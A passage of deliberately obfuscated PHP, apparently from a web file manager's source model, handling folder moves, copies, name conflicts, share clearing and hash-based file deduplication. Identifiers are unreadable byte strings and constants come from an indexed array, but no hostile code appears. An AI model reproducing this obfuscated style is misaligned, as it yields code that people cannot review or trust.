$›åÔ¶ØÎ[count($›åÔ¶ØÎ) - 1]; return array($àôÈÆÚá[182] => $ıæÓ”ËĞ, $àôÈÆÚá[565] => $Î¿¬òˆˆ); } private function _makeItemData($í‹‡€®, $Âè€ôÑì, $“Íªì£†) { $‚™¢‚¦‰ =& $_SERVER[ •ŒÓîÆ]; $•êòÒó° = array($‚™¢‚¦‰[626] => $í‹‡€®[$‚™¢‚¦‰[464]], $‚™¢‚¦‰[473] => $“Íªì£†, $‚™¢‚¦‰[627] => $í‹‡€®[$‚™¢‚¦‰[465]] ? $í‹‡€®[$‚™¢‚¦‰[465]] : $‚™¢‚¦‰[12], $‚™¢‚¦‰[521] => $í‹‡€®[$‚™¢‚¦‰[520]] ? $í‹‡€®[$‚™¢‚¦‰[520]] : 0, $‚™¢‚¦‰[597] => $í‹‡€®[$‚™¢‚¦‰[78]] ? $í‹‡€®[$‚™¢‚¦‰[78]] : 0, $‚™¢‚¦‰[628] => intval($Âè€ôÑì[$‚™¢‚¦‰[180]]), $‚™¢‚¦‰[629] => intval($Âè€ôÑì[$‚™¢‚¦‰[550]]), $‚™¢‚¦‰[630] => intval(USER_ID), $‚™¢‚¦‰[631] => intval(USER_ID), $‚™¢‚¦‰[456] => intval($Âè€ôÑì[$‚™¢‚¦‰[183]]), $‚™¢‚¦‰[632] => $Âè€ôÑì[$‚™¢‚¦‰[565]] . $Âè€ôÑì[$‚™¢‚¦‰[183]] . $‚™¢‚¦‰[50], $‚™¢‚¦‰[477] => $í‹‡€®[$‚™¢‚¦‰[87]] ? $í‹‡€®[$‚™¢‚¦‰[87]] : time(), $‚™¢‚¦‰[483] => 0, $‚™¢‚¦‰[633] => $‚™¢‚¦‰[12]); return $•êòÒó°; } private function _copyApplyMeta($‰ô¡Êö , &$şÉÓÒ½) { $¨ÂÖÛÍö =& $_SERVER[ •ŒÓîÆ]; $…¿õÎ¥· = $‰ô¡Êö [$¨ÂÖÛÍö[183]]; $Ò¾œãç = $‰ô¡Êö [$¨ÂÖÛÍö[32]]; if (!isset($‰ô¡Êö [$¨ÂÖÛÍö[634]]) || !$‰ô¡Êö [$¨ÂÖÛÍö[634]] || $‰ô¡Êö [$¨ÂÖÛÍö[634]] == $¨ÂÖÛÍö[214]) { $şÉÓÒ½[$¨ÂÖÛÍö[611]][] = array($¨ÂÖÛÍö[183], $…¿õÎ¥·, $¨ÂÖÛÍö[634], short_id($…¿õÎ¥·)); } if (Input::check($Ò¾œãç, $¨ÂÖÛÍö[635])) { $şÉÓÒ½[$¨ÂÖÛÍö[610]][] = array($¨ÂÖÛÍö[183] => $…¿õÎ¥·, $¨ÂÖÛÍö[96] => $¨ÂÖÛÍö[517], $¨ÂÖÛÍö[429] => str_replace($¨ÂÖÛÍö[53], $¨ÂÖÛÍö[12], Pinyin::get($Ò¾œãç))); $şÉÓÒ½[$¨ÂÖÛÍö[610]][] = array($¨ÂÖÛÍö[183] => $…¿õÎ¥·, $¨ÂÖÛÍö[96] => $¨ÂÖÛÍö[516], $¨ÂÖÛÍö[429] => Pinyin::get($Ò¾œãç, $¨ÂÖÛÍö[636])); } $şÉÓÒ½[$¨ÂÖÛÍö[610]][] = array($¨ÂÖÛÍö[183] => $…¿õÎ¥·, $¨ÂÖÛÍö[96] => $¨ÂÖÛÍö[496], $¨ÂÖÛÍö[429] => KodSort::makeStr($Ò¾œãç)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($‹šæ½—ç) { $Á›•’Ó¾ =& $_SERVER[ •ŒÓîÆ]; $±³•Ï±ê = $this->sourceInfo($‹šæ½—ç); $ë•»šİ‰ = $Á›•’Ó¾[637]; $ì™á³ÆÕ = array($Á›•’Ó¾[565] => array($Á›•’Ó¾[592], $±³•Ï±ê[$Á›•’Ó¾[565]] . $‹šæ½—ç . $Á›•’Ó¾[593]), $Á›•’Ó¾[484] => $this->targetIsDelete); $ŒŸ¤À¿ = $this->field($ë•»šİ‰)->where($ì™á³ÆÕ)->select(); if (!$ŒŸ¤À¿) { return; } $ŒŸ¤À¿ = array_to_keyvalue($ŒŸ¤À¿, $Á›•’Ó¾[183]); foreach ($ŒŸ¤À¿ as $™´‡õ¿õ) { $ä´Çõ¡” = $™´‡õ¿õ[$Á›•’Ó¾[182]]; $‹šæ½—ç = $™´‡õ¿õ[$Á›•’Ó¾[183]]; if (!isset($this->_childrenListCache[$‹šæ½—ç]) && $™´‡õ¿õ[$Á›•’Ó¾[464]] == $Á›•’Ó¾[90]) { $this->_childrenListCache[$‹šæ½—ç] = array(); } if (!isset($this->_childrenListCache[$ä´Çõ¡”])) { $this->_childrenListCache[$ä´Çõ¡”] = array(); } $this->_childrenListCache[$ä´Çõ¡”][$‹šæ½—ç] = $™´‡õ¿õ; $this->_childrenItemCache[$‹šæ½—ç] = $™´‡õ¿õ; } } private function _childrenListAll($âƒ¾¡§, &$¡¼¨ÑÈµ) { $­¬ªèü– =& $_SERVER[ •ŒÓîÆ]; if (!isset($this->_childrenListCache[$âƒ¾¡§])) { return; } $í½úüøŸ = $this->_childrenListCache[$âƒ¾¡§]; foreach ($í½úüøŸ as $‰¢ü¹É => $üÜûÕš·) { $¡¼¨ÑÈµ[$‰¢ü¹É] = $üÜûÕš·; if ($üÜûÕš·[$­¬ªèü–[464]] == $­¬ªèü–[90]) { $this->_childrenListAll($‰¢ü¹É, $¡¼¨ÑÈµ); } } } private function sourceInfoCache($¿ş­í’) { if (isset($this->_childrenItemCache[$¿ş­í’])) { return $this->_childrenItemCache[$¿ş­í’]; } return $this->sourceInfo($¿ş­í’); } private function _childrenList($ÖãÅà’) { if (isset($this->_childrenListCache[$ÖãÅà’])) { return $this->_childrenListCache[$ÖãÅà’]; } return $this->_childrenListSelect($ÖãÅà’); } private function _childrenListSelect($Û‡±•Ú) { $©ŠÖº¿ì =& $_SERVER[ •ŒÓîÆ]; $»Î£Á¿ = array($©ŠÖº¿ì[182] => $Û‡±•Ú, $©ŠÖº¿ì[484] => $this->targetIsDelete); $Âì‡“°Ê = $this->where($»Î£Á¿)->select(); $Âì‡“°Ê = $Âì‡“°Ê ? $Âì‡“°Ê : array(); $ÄƒüÀ„ì = array_to_keyvalue($Âì‡“°Ê, $©ŠÖº¿ì[183]); $this->_childrenListCache[$Û‡±•Ú] = $ÄƒüÀ„ì; foreach ($ÄƒüÀ„ì as $Û‡±•Ú => $×Á¾¶ñµ) { $this->_childrenItemCache[$Û‡±•Ú] = $×Á¾¶ñµ; } return $ÄƒüÀ„ì; } private function fileNameExistAuto($ê»¡ÏÆù, $ÒµóéÜÄ) { $úß¹‰ş =& $_SERVER[ •ŒÓîÆ]; if ($ÒµóéÜÄ[$úß¹‰ş[484]] == $úß¹‰ş[90]) { return $this->fileNameExist($ê»¡ÏÆù, $ÒµóéÜÄ[$úß¹‰ş[32]]); } return $this->fileNameExistCache($ê»¡ÏÆù, $ÒµóéÜÄ[$úß¹‰ş[32]]); } private function fileNameExistCache($‡äÆı„, $í£¬¡ô­) { $å³‚ö¶„ =& $_SERVER[ •ŒÓîÆ]; $í£¬¡ô­ = strtolower($í£¬¡ô­); $Õ«œş‚è = $this->_childrenList($‡äÆı„); foreach ($Õ«œş‚è as $›ºØÛø») { if ($í£¬¡ô­ == strtolower($›ºØÛø»[$å³‚ö¶„[32]])) { return $›ºØÛø»[$å³‚ö¶„[183]]; } } return !1; } private function fileNameAutoCache($ĞªŠã²µ, $šã¯Ó÷Ê, $¼•É¨™, $ñƒ‚ÔÁì) { $ášİëˆ =& $_SERVER[ •ŒÓîÆ]; $Ïêğ„·— = $this->_childrenList($ĞªŠã²µ); $‹ï†‰ˆ¨ = array_to_keyvalue($Ïêğ„·—, $ášİëˆ[12], $ášİëˆ[32]); return $this->fileNameAutoGet($‹ï†‰ˆ¨, $šã¯Ó÷Ê, $¼•É¨™, $ñƒ‚ÔÁì); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($¥âÛæ, $Äñ¼§Ë¯, $Êªù—£ = REPEAT_REPLACE, $‹ñ®Å«Ã = '') { $Å‹´ôê =& $_SERVER[ •ŒÓîÆ]; $êÑ½·ŠÁ = $this->sourceInfo($¥âÛæ); $±ßî€ú‘ = $this->sourceInfo($Äñ¼§Ë¯); if ($êÑ½·ŠÁ[$Å‹´ôê[182]] == $±ßî€ú‘[$Å‹´ôê[183]]) { if ($êÑ½·ŠÁ[$Å‹´ôê[484]] == $Å‹´ôê[90]) { Model($Å‹´ôê[482])->restore(array($¥âÛæ)); } if (!$‹ñ®Å«Ã || $‹ñ®Å«Ã == $êÑ½·ŠÁ[$Å‹´ôê[32]]) { return $¥âÛæ; } } $ê–ÅÑ½² = $this->pathInfoMore($¥âÛæ); if ($this->isParentOf($¥âÛæ, $Äñ¼§Ë¯)) { return !1; } if (!$êÑ½·ŠÁ || !$±ßî€ú‘ || $±ßî€ú‘[$Å‹´ôê[464]] != $Å‹´ôê[90]) { return !1; } Hook::trigger($Å‹´ôê[638], $ê–ÅÑ½²); $this->targetIsDelete = intval($êÑ½·ŠÁ[$Å‹´ôê[484]]); if ($êÑ½·ŠÁ[$Å‹´ôê[182]] == $Äñ¼§Ë¯ && $‹ñ®Å«Ã != $êÑ½·ŠÁ[$Å‹´ôê[32]]) { $İåÎÄïƒ = $this->fileNameExist($Äñ¼§Ë¯, $‹ñ®Å«Ã); if ($İåÎÄïƒ && $êÑ½·ŠÁ[$Å‹´ôê[464]] == $Å‹´ôê[214]) { $¢¸Œ…²î = $this->sourceInfo($İåÎÄïƒ); $ê§’ËÑƒ = $this->fileHistory($¢¸Œ…²î, $êÑ½·ŠÁ[$Å‹´ôê[520]], $êÑ½·ŠÁ[$Å‹´ôê[78]]); if (!$ê§’ËÑƒ) { Model($Å‹´ôê[523])->remove($êÑ½·ŠÁ[$Å‹´ôê[520]]); } $this->removeNow($¥âÛæ, !1); $this->folderSizeReset($Äñ¼§Ë¯); Hook::trigger($Å‹´ôê[639], $ê–ÅÑ½²); return $İåÎÄïƒ; } } $ßÏÖªæş = $‹ñ®Å«Ã ? $‹ñ®Å«Ã : $êÑ½·ŠÁ[$Å‹´ôê[32]]; $this->lockMoveStart($¥âÛæ); $this->lockWriteStart($Äñ¼§Ë¯, $ßÏÖªæş); $‡€³¬Åù = array($Å‹´ôê[609] => array(), $Å‹´ôê[640] => !1); $this->clearShare($¥âÛæ, $Äñ¼§Ë¯); $À¦÷ƒæ• = $this->fileNameExistAuto($Äñ¼§Ë¯, $êÑ½·ŠÁ); $óç¨ûÕ‰ = $this->_move($¥âÛæ, $Äñ¼§Ë¯, $Êªù—£, $‡€³¬Åù, $‹ñ®Å«Ã); $this->sourceCacheClear(); if ($êÑ½·ŠÁ[$Å‹´ôê[464]] == $Å‹´ôê[90] && $À¦÷ƒæ•) { $this->folderSizeResetChildren($óç¨ûÕ‰); } Model($Å‹´ôê[216])->linkAdd($‡€³¬Åù[$Å‹´ôê[609]]); if ($À¦÷ƒæ• && $‡€³¬Åù[$Å‹´ôê[640]]) { $this->removeNow($¥âÛæ, !1); } $this->lockMoveEnd($¥âÛæ); $this->lockWriteEnd($Äñ¼§Ë¯, $ßÏÖªæş); $this->folderSizeReset($êÑ½·ŠÁ[$Å‹´ôê[182]]); $this->folderSizeReset($Äñ¼§Ë¯); $Òœ½—«È = array($êÑ½·ŠÁ[$Å‹´ôê[182]], $Äñ¼§Ë¯); if ($êÑ½·ŠÁ[$Å‹´ôê[464]] == $Å‹´ôê[90]) { $Òœ½—«È[] = $¥âÛæ; } $this->updateModifyTime($Òœ½—«È); Model($Å‹´ôê[613])->eventMove($¥âÛæ, $êÑ½·ŠÁ[$Å‹´ôê[182]], $Äñ¼§Ë¯); Hook::trigger($Å‹´ôê[639], $ê–ÅÑ½²); return $óç¨ûÕ‰; } private function _move($ç’”†ë„, $î§«±à˜, $²†™ú‚¬, &$‘œ¶ÀøÎ, $Û‡Ï¯°Ä = '') { $û¿·×»Ö =& $_SERVER[ •ŒÓîÆ]; $¥Å†Ì÷¤ = $this->sourceInfo($ç’”†ë„); $®”Ç“¾º = $¥Å†Ì÷¤[$û¿·×»Ö[464]] == $û¿·×»Ö[90]; $ûÓôÃ™ = $Û‡Ï¯°Ä ? $Û‡Ï¯°Ä : $¥Å†Ì÷¤[$û¿·×»Ö[32]]; $æåµó€« = $this->fileNameExistAuto($î§«±à˜, $¥Å†Ì÷¤); $this->lockMoveStart($ç’”†ë„); $this->lockWriteStart($î§«±à˜, $ûÓôÃ™); if (!$æåµó€«) { return $this->_moveForce($ç’”†ë„, $î§«±à˜, $ûÓôÃ™); } $ı°ãˆ÷á = $æåµó€«; $‹ñé±Âõ = !1; if ($®”Ç“¾º) { if ($²†™ú‚¬ == REPEAT_RENAME_FOLDER) { $ûÓôÃ™ = $this->fileNameAuto($î§«±à˜, $ûÓôÃ™, $²†™ú‚¬, $®”Ç“¾º); $ı°ãˆ÷á = $this->_moveForce($ç’”†ë„, $î§«±à˜, $ûÓôÃ™); } else { if ($²†™ú‚¬ == REPEAT_RENAME_FOLDER) { $²†™ú‚¬ = REPEAT_RENAME; } $Ï¿ªÉôŠ = $this->_childrenListSelect($ç’”†ë„); foreach ($Ï¿ªÉôŠ as $®²Ë¸ì²) { $this->_move($®²Ë¸ì²[$û¿·×»Ö[183]], $æåµó€«, $²†™ú‚¬, $‘œ¶ÀøÎ); } $‹ñé±Âõ = !0; } } else { if ($²†™ú‚¬ == REPEAT_SKIP) { $‹ñé±Âõ = !0; } else { if ($²†™ú‚¬ == REPEAT_RENAME || $²†™ú‚¬ == REPEAT_RENAME_FOLDER) { $ûÓôÃ™ = $this->fileNameAuto($î§«±à˜, $ûÓôÃ™, $²†™ú‚¬, $®”Ç“¾º); $ı°ãˆ÷á = $this->_moveForce($ç’”†ë„, $î§«±à˜, $ûÓôÃ™); } else { if ($²†™ú‚¬ == REPEAT_REPLACE) { $‚¹õ×Ø = $this->sourceInfoCache($æåµó€«); $ÜÈíİü¢ = $this->fileHistory($‚¹õ×Ø, $¥Å†Ì÷¤[$û¿·×»Ö[520]], $¥Å†Ì÷¤[$û¿·×»Ö[78]]); $‹ñé±Âõ = !0; if ($ÜÈíİü¢) { $‘œ¶ÀøÎ[$û¿·×»Ö[609]][] = $¥Å†Ì÷¤[$û¿·×»Ö[520]]; } } } } } if ($‹ñé±Âõ && !$‘œ¶ÀøÎ[$û¿·×»Ö[640]]) { $‘œ¶ÀøÎ[$û¿·×»Ö[640]] = !0; } return $ı°ãˆ÷á; } private function _moveForce($ÒÕåÂº¥, $úÉ›‰¥Ì, $†Ş¾ˆÄ) { $ôš½õúë =& $_SERVER[ •ŒÓîÆ]; $‡‰ØÍú¥ = $this->sourceInfo($ÒÕåÂº¥); $½‡ó¸İ = $this->sourceInfo($úÉ›‰¥Ì); $¯õÇŠøÀ = $‡‰ØÍú¥[$ôš½õúë[464]] == $ôš½õúë[90]; $ şñ—ğ­ = array($ôš½õúë[456] => $½‡ó¸İ[$ôš½õúë[183]], $ôš½õúë[632] => $½‡ó¸İ[$ôš½õúë[565]] . $½‡ó¸İ[$ôš½õúë[183]] . $ôš½õúë[50], $ôš½õúë[628] => $½‡ó¸İ[$ôš½õúë[180]], $ôš½õúë[629] => $½‡ó¸İ[$ôš½õúë[550]], $ôš½õúë[631] => USER_ID, $ôš½õúë[473] => $†Ş¾ˆÄ); $¹Œ¬’ÎŞ = $‡‰ØÍú¥[$ôš½õúë[180]] == SourceModel::TYPE_GROUP && $½‡ó¸İ[$ôš½õúë[180]] == SourceModel::TYPE_GROUP && $‡‰ØÍú¥[$ôš½õúë[550]] == $½‡ó¸İ[$ôš½õúë[550]]; if (!$¹Œ¬’ÎŞ && $this->moveClearAuth) { Model($ôš½õúë[547])->authClear($ÒÕåÂº¥); } $ï£’®ä» = $‡‰ØÍú¥[$ôš½õúë[484]] == $ôš½õúë[90] && $½‡ó¸İ[$ôš½õúë[484]] != $ôš½õúë[90]; if ($ï£’®ä») { $ şñ—ğ­[$ôš½õúë[483]] = 0; } if ($¯õÇŠøÀ) { $›ÛËÃòÉ = array($ôš½õúë[632] => array($ôš½õúë[592], $‡‰ØÍú¥[$ôš½õúë[565]] . $‡‰ØÍú¥[$ôš½õúë[183]] . $ôš½õúë[593])); $©Ï€¥İ» = $‡‰ØÍú¥[$ôš½õúë[565]] . $‡‰ØÍú¥[$ôš½õúë[183]] . $ôš½õúë[50]; $´ÓÇúáÓ = $½‡ó¸İ[$ôš½õúë[565]] . $½‡ó¸İ[$ôš½õúë[183]] . $ôš½õúë[50] . $‡‰ØÍú¥[$ôš½õúë[183]] . $ôš½õúë[50]; $Ş¾óî®Ø = array($ôš½õúë[632] => array($ôš½õúë[641], "\162\145\160\x6c\x61\x63\x65\x28\160\x61\x72\145\x6e\x74\x4c\x65\166\145\x6c\54\47{$©Ï€¥İ»}\47\x2c\47{$´ÓÇúáÓ}\x27\51"), $ôš½õúë[628] => $½‡ó¸İ[$ôš½õúë[180]], $ôš½õúë[629] => $½‡ó¸İ[$ôš½õúë[550]]); if ($ï£’®ä») { $Ş¾óî®Ø[$ôš½õúë[483]] = 0; } $this->where($›ÛËÃòÉ)->data($Ş¾óî®Ø)->save(); } $this->where(array($ôš½õúë[470] => $ÒÕåÂº¥))->data($ şñ—ğ­)->save(); return $ÒÕåÂº¥; } private function clearShare($³²úÚ¸î, $–ËÔÊ‹Ñ) { $øÁ‘†ıÚ =& $_SERVER[ •ŒÓîÆ]; $¨“Ü‹÷ï = $this->sourceInfo($³²úÚ¸î); $ÙÄŸÎçŸ = $this->sourceInfo($–ËÔÊ‹Ñ); if ($¨“Ü‹÷ï[$øÁ‘†ıÚ[550]] == $ÙÄŸÎçŸ[$øÁ‘†ıÚ[550]] && $¨“Ü‹÷ï[$øÁ‘†ıÚ[180]] == $øÁ‘†ıÚ[642]) { return; } $ÖÇ•ğ–Ì = array($øÁ‘†ıÚ[565] => array($øÁ‘†ıÚ[592], $¨“Ü‹÷ï[$øÁ‘†ıÚ[565]] . $³²úÚ¸î . $øÁ‘†ıÚ[593])); $åõÙ°¡ = $this->field($øÁ‘†ıÚ[470])->where($ÖÇ•ğ–Ì)->getField($øÁ‘†ıÚ[183], !0); if (!$åõÙ°¡) { return; } $ÖÇ•ğ–Ì = array($øÁ‘†ıÚ[183] => array($øÁ‘†ıÚ[7], $åõÙ°¡), $øÁ‘†ıÚ[643] => 1); $ËÏˆ¾†û = Model($øÁ‘†ıÚ[644])->field($øÁ‘†ıÚ[645])->where($ÖÇ•ğ–Ì)->select(); if (!$ËÏˆ¾†û) { return; } $ËÏˆ¾†û = array_to_keyvalue($ËÏˆ¾†û, $øÁ‘†ıÚ[12], $øÁ‘†ıÚ[645]); $ÖÇ•ğ–Ì = array($øÁ‘†ıÚ[645] => array($øÁ‘†ıÚ[7], $ËÏˆ¾†û)); Model($øÁ‘†ıÚ[644])->where($ÖÇ•ğ–Ì)->save(array($øÁ‘†ıÚ[643] => 0)); Model($øÁ‘†ıÚ[646])->where($ÖÇ•ğ–Ì)->delete(); } public function copyFolderFromIO($Í©êŞïå, $ãúäªÚÂ, $ƒÜû¯í, $•¦÷É¡Ú, $ºüğ¦Ş«, $ ¬¡×İ = false) { $êÕÕùü =& $_SERVER[ •ŒÓîÆ]; $à¾Ö¸¦° = array($êÕÕùü[610] => array(), $êÕÕùü[611] => array(), $êÕÕùü[609] => array(), $êÕÕùü[647] => array()); $ˆ…µë¸ = $ ¬¡×İ ? $ ¬¡×İ : $Í©êŞïå->pathThis($ãúäªÚÂ); $‚–­ñùñ = $this->fileNameExist($ƒÜû¯í, $ˆ…µë¸); $ŸÖ˜Ø£Ù = $this->mkdir($ƒÜû¯í, $ˆ…µë¸, $•¦÷É¡Ú); if (!$‚–­ñùñ || $•¦÷É¡Ú == REPEAT_RENAME_FOLDER) { $•¦÷É¡Ú = !1; } if ($‚–­ñùñ) { $this->_childrenAllMake($‚–­ñùñ); } Hook::trigger($êÕÕùü[648]); $this->_copyChildTo($Í©êŞïå, $ãúäªÚÂ, $ŸÖ˜Ø£Ù, $•¦÷É¡Ú, $à¾Ö¸¦°, $ºüğ¦Ş«); Hook::trigger($êÕÕùü[649]); if ($ŸÖ˜Ø£Ù) { $this->folderSizeResetChildren($ŸÖ˜Ø£Ù); } $this->_childrenListClear(); Model($êÕÕùü[612])->addAll($à¾Ö¸¦°[$êÕÕùü[610]], array(), !0); Model($êÕÕùü[613])->eventCopy($ŸÖ˜Ø£Ù); $this->saveAll($à¾Ö¸¦°[$êÕÕùü[611]]); Model($êÕÕùü[523])->linkAdd($à¾Ö¸¦°[$êÕÕùü[609]]); Model($êÕÕùü[523])->remove($à¾Ö¸¦°[$êÕÕùü[647]]); $this->folderSizeReset($ƒÜû¯í); $this->updateModifyTime($ƒÜû¯í); return $ŸÖ˜Ø£Ù; } private function _copyChildTo($ŠŸöğ“ß, $¾›Åê¨Ÿ, $İóÎÙµê, $ÓŠÕ¢±£, &$ıÒ–Î­, $éş£ÕÉé) { $Õ©¶î¼÷ =& $_SERVER[ •ŒÓîÆ]; $­ğØÎ”¶ = $this->sourceInfoCache($İóÎÙµê); $şˆ“ú¥­ = $ŠŸöğ“ß->listPath($¾›Åê¨Ÿ); $şˆ“ú¥­ = $şˆ“ú¥­ ? $şˆ“ú¥­ : array($Õ©¶î¼÷[85] => array(), $Õ©¶î¼÷[84] => array()); $ù‘öçë¶ = array_merge($şˆ“ú¥­[$Õ©¶î¼÷[85]], $şˆ“ú¥­[$Õ©¶î¼÷[84]]); $Íï‰¥´ü = $this->_addFiles($ŠŸöğ“ß, $şˆ“ú¥­[$Õ©¶î¼÷[85]], $éş£ÕÉé); $–Ëã“ç = array(); foreach ($ù‘öçë¶ as &$©èÜ²ÜÓ) { if (isset($Íï‰¥´ü[$©èÜ²ÜÓ[$Õ©¶î¼÷[32]]])) { $©èÜ²ÜÓ = $Íï‰¥´ü[$©èÜ²ÜÓ[$Õ©¶î¼÷[32]]]; } $©èÜ²ÜÓ[$Õ©¶î¼÷[464]] = $©èÜ²ÜÓ[$Õ©¶î¼÷[33]] == $Õ©¶î¼÷[77]; $©èÜ²ÜÓ[$Õ©¶î¼÷[465]] = substr(_get($©èÜ²ÜÓ, $Õ©¶î¼÷[177], $Õ©¶î¼÷[12]), 0, 10); $©èÜ²ÜÓ[$Õ©¶î¼÷[78]] = _get($©èÜ²ÜÓ, $Õ©¶î¼÷[78], 0); $©èÜ²ÜÓ[$Õ©¶î¼÷[520]] = _get($©èÜ²ÜÓ, $Õ©¶î¼÷[520], 0); if (!isset($©èÜ²ÜÓ[$Õ©¶î¼÷[650]]) && $©èÜ²ÜÓ[$Õ©¶î¼÷[520]]) { $ıÒ–Î­[$Õ©¶î¼÷[647]][] = $©èÜ²ÜÓ[$Õ©¶î¼÷[520]]; } if ($ÓŠÕ¢±£) { $åş»Ûè = $this->fileNameExistCache($İóÎÙµê, $©èÜ²ÜÓ[$Õ©¶î¼÷[32]]); if ($åş»Ûè) { if ($©èÜ²ÜÓ[$Õ©¶î¼÷[464]] || $ÓŠÕ¢±£ == REPEAT_SKIP) { continue; } if ($ÓŠÕ¢±£ == REPEAT_REPLACE) { $ùñ’×™¸ = $this->sourceInfoCache($åş»Ûè); $ôà‡Òİ« = $this->fileHistory($ùñ’×™¸, $©èÜ²ÜÓ[$Õ©¶î¼÷[520]], $©èÜ²ÜÓ[$Õ©¶î¼÷[78]]); if ($ôà‡Òİ«) { $ıÒ–Î­[$Õ©¶î¼÷[609]][] = $©èÜ²ÜÓ[$Õ©¶î¼÷[520]]; } continue; } else { if ($ÓŠÕ¢±£ == REPEAT_RENAME) { $©èÜ²ÜÓ[$Õ©¶î¼÷[32]] = $this->fileNameAutoCache($İóÎÙµê, $©èÜ²ÜÓ[$Õ©¶î¼÷[32]], $ÓŠÕ¢±£, !1); } } } } if (!$©èÜ²ÜÓ[$Õ©¶î¼÷[464]] && $©èÜ²ÜÓ[$Õ©¶î¼÷[520]] == 0) { continue; } if (!$©èÜ²ÜÓ[$Õ©¶î¼÷[464]] && $©èÜ²ÜÓ[$Õ©¶î¼÷[520]]) { $ıÒ–Î­[$Õ©¶î¼÷[609]][] = $©èÜ²ÜÓ[$Õ©¶î¼÷[520]]; } $–Ëã“ç[] = $this->_makeItemData($©èÜ²ÜÓ, $­ğØÎ”¶, $©èÜ²ÜÓ[$Õ©¶î¼÷[32]]); } unset($©èÜ²ÜÓ); if (!empty($–Ëã“ç)) { $this->addAll($–Ëã“ç); $this->_childrenListSelect($İóÎÙµê); } $½¿«¯˜¡ = $this->_childrenList($İóÎÙµê); $½¿«¯˜¡ = array_to_keyvalue($½¿«¯˜¡, $Õ©¶î¼÷[32]); foreach ($ù‘öçë¶ as $©èÜ²ÜÓ) { $ùñ’×™¸ = $½¿«¯˜¡[$©èÜ²ÜÓ[$Õ©¶î¼÷[32]]]; $®›“äÔ = $ùñ’×™¸[$Õ©¶î¼÷[183]]; $this->_copyApplyMeta($ùñ’×™¸, $ıÒ–Î­); if ($©èÜ²ÜÓ[$Õ©¶î¼÷[33]] == $Õ©¶î¼÷[77]) { $©èÜ²ÜÓ[$Õ©¶î¼÷[86]] = $ŠŸöğ“ß->getPathInner($©èÜ²ÜÓ[$Õ©¶î¼÷[86]]); $this->_copyChildTo($ŠŸöğ“ß, $©èÜ²ÜÓ[$Õ©¶î¼÷[86]], $®›“äÔ, $ÓŠÕ¢±£, $ıÒ–Î­, $éş£ÕÉé); } } } private function _addFiles($ŠÀšÅ, $Òû¥¿‡¯, $·ø¡€Îõ) { $§ƒó‘‹í =& $_SERVER[ •ŒÓîÆ]; if (!$Òû¥¿‡¯ || count($Òû¥¿‡¯) == 0) { return array(); } $®Ø“û¾— = array(); foreach ($Òû¥¿‡¯ as &$ò®ß¶™›) { Hook::trigger($§ƒó‘‹í[651], $ò®ß¶™›); $ò®ß¶™›[$§ƒó‘‹í[86]] = $ŠÀšÅ->getPathInner($ò®ß¶™›[$§ƒó‘‹í[86]]); $ØÃı™Æö = $ŠÀšÅ->hashSimple($ò®ß¶™›[$§ƒó‘‹í[86]]); $ ¸•¾Ü© = $ŠÀšÅ->hashMd5($ò®ß¶™›[$§ƒó‘‹í[86]]); if (strlen($ ¸•¾Ü©) > 10 && !isset($®Ø“û¾—[$ ¸•¾Ü©])) { $®Ø“û¾—[$ ¸•¾Ü©] = array(); } $ò®ß¶™›[$§ƒó‘‹í[652]] = $ØÃı™Æö; $ò®ß¶™›[$§ƒó‘‹í[526]] = $ ¸•¾Ü©; $®Ø“û¾—[$ ¸•¾Ü©][] =& $ò®ß¶™›; if (count($®Ø“û¾—[$ ¸•¾Ü©]) > 1) { $ò®ß¶™›[$§ƒó‘‹í[650]] = !0; } Hook::trigger($§ƒó‘‹í[653], $ò®ß¶™›); } unset($ò®ß¶™›); $‰Ä×üñı = array($§ƒó‘‹í[526] => array($§ƒó‘‹í[7], array_keys($®Ø“û¾—))); $àã„èø‘ = Model($§ƒó‘‹í[654]); $—–£Şâ‹ = $àã„èø‘->where($‰Ä×üñı)->select(); $—–£Şâ‹ = $—–£Şâ‹ ? $—–£Şâ‹ : array(); foreach ($—–£Şâ‹ as $õ‘”Ççù) { if (!isset($®Ø“û¾—[$õ‘”Ççù[$§ƒó‘‹í[526]]])) { continue; } $”áÄ§ğÍ = $®Ø“û¾—[$õ‘”Ççù[$§ƒó‘‹í[526]]]; foreach ($”áÄ§ğÍ as &$ò®ß¶™›) { $ò®ß¶™›[$§ƒó‘‹í[520]] = $õ‘”Ççù[$§ƒó‘‹í[520]]; $ò®ß¶™›[$§ƒó‘‹í[650]] = !0; } unset($ò®ß¶™›); } $Ü©¾ É» = array(); foreach ($Òû¥¿‡¯ as $«õ±øŠ¿) { Hook::trigger($§ƒó‘‹í[655], $«õ±øŠ¿); if (isset($«õ±øŠ¿[$§ƒó‘‹í[650]]) && $«õ±øŠ¿[$§ƒó‘‹í[650]]) { Hook::trigger($§ƒó‘‹í[656], $«õ±øŠ¿); continue; } $Ø¨Ó‚Û = $ŠÀšÅ->getPathInner($«õ±øŠ¿[$§ƒó‘‹í[86]]); $²Âƒ®ÖŠ = $àã„èø‘->addFileMake($Ø¨Ó‚Û, $«õ±øŠ¿[$§ƒó‘‹í[78]], $«õ±øŠ¿[$§ƒó‘‹í[652]], $«õ±øŠ¿[$§ƒó‘‹í[526]], $«õ±øŠ¿[$§ƒó‘‹í[32]], $·ø¡€Îõ); Hook::trigger($§ƒó‘‹í[656], $«õ±øŠ¿); if (!is_array($²Âƒ®ÖŠ)) { continue; } $Ü©¾ É»[] = $²Âƒ®ÖŠ; } $àã„èø‘->addAll($Ü©¾ É»); $‰Ä×üñı = array($§ƒó‘‹í[526] => array($§ƒó‘‹í[7], array_keys($®Ø“û¾—))); $—–£Şâ‹ = $àã„èø‘->where($‰Ä×üñı)->select(); $—–£Şâ‹ = $—–£Şâ‹ ? $—–£Şâ‹ : array(); foreach ($—–£Şâ‹ as $õ‘”Ççù) { if (!isset($®Ø“û¾—[$õ‘”Ççù[$§ƒó‘‹í[526]]])) { continue; } $¦ÂÑòÜ =& $®Ø“û¾—[$õ‘”Ççù[$§ƒó‘‹í[526]]]; foreach ($¦ÂÑòÜ as &$ò®ß¶™›) { $ò®ß¶™›[$§ƒó‘‹í[520]] = $õ‘”Ççù[$§ƒó‘‹í[520]]; } unset($ò®ß¶™›); } $…Ç´ß­ò = array(); foreach ($Òû¥¿‡¯ as $‰ß®Ø†…) { $…Ç´ß­ò[$‰ß®Ø†…[$§ƒó‘‹í[32]]] = $‰ß®Ø†…; } return $…Ç´ß­ò; } } 